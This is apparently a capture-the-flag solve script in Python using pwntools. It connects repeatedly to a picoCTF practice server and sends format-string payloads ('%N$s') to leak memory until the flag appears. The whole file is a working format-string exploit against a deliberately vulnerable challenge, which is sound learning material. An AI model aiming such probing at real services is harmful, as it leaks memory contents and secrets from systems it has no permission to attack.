from pwn import *


for i in range(30):
	p = remote('saturn.picoctf.net', 55038)
	p.sendlineafter('>>', '%' + str(i) + '$s')
	resp = p.recvall()
	print(resp)
	if b'pico' in resp:
		break
	p.close()
